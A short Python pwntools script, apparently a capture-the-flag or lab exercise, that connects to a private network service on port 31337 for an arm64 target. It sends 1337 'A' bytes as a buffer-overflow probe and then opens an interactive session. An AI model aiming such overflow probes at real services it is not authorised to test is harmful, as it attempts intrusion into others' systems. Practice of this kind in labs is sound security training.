import pwn

pwn.context.arch = 'arm64'
remote = pwn.remote('10.100.96.3', 31337)

msg = remote.recvline().decode()
print(msg)

remote.sendline(b'A' * 1337)

msg = remote.recvline().decode()
print(msg)

remote.interactive()
remote.close()